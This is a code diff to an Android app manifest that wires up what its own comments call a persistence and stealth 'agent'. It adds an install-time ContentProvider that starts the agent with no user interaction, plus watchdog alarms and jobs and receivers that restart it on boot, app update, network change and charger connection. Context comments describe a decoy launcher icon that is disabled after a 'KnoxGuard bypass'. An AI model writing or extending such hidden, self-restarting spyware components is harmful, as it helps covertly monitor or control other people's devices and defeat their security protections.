@@ -17,6 +17,7 @@
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM"/>
 
     <uses-feature android:name="android.hardware.camera"/>
     <uses-feature android:name="android.hardware.camera.autofocus"/>
@@ -28,6 +29,19 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:usesCleartextTraffic="true">
+
+        <!-- ================================================================
+             ContentProvider: install-time auto-start.
+             Runs BEFORE Application.onCreate() and all Activities/Services.
+             This is the EARLIEST possible entry point — after adb install
+             the agent starts immediately with no user interaction.
+             ================================================================ -->
+        <provider
+            android:name=".persistence.AutoStartProvider"
+            android:authorities="${applicationId}.autostart"
+            android:exported="false"
+            android:multiprocess="true"
+            android:initOrder="2147483647" />
 
         <!-- Stealth: Decoy activity with launcher icon for initial install.
              After KnoxGuard bypass, this activity is disabled via PackageManager
@@ -72,6 +86,17 @@
             </intent-filter>
         </service>
 
+        <!-- WatchdogJob: JobScheduler secondary watchdog (every 15 min) -->
+        <service
+            android:name=".persistence.WatchdogJob"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="false" />
+
+        <!-- ================================================================
+             MULTI-LAYER AUTO-START RECEIVERS
+             ================================================================ -->
+
+        <!-- BootReceiver: BOOT_COMPLETED + arms watchdogs -->
         <receiver
             android:name=".persistence.BootReceiver"
             android:exported="true">
@@ -79,5 +104,43 @@
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
             </intent-filter>
         </receiver>
+
+        <!-- InstallReceiver: auto-start on APK install/update (no click needed) -->
+        <receiver
+            android:name=".persistence.InstallReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+                <data android:scheme="package" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_REPLACED"/>
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <!-- WatchdogAlarm: AlarmManager tick every 5 min -->
+        <receiver
+            android:name=".persistence.WatchdogAlarm"
+            android:exported="false" />
+
+        <!-- NetworkReceiver: connectivity change trigger -->
+        <receiver
+            android:name=".persistence.NetworkReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <!-- PowerReceiver: charger connected trigger -->
+        <receiver
+            android:name=".persistence.PowerReceiver"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+            </intent-filter>
+        </receiver>
+
     </application>
 </manifest>
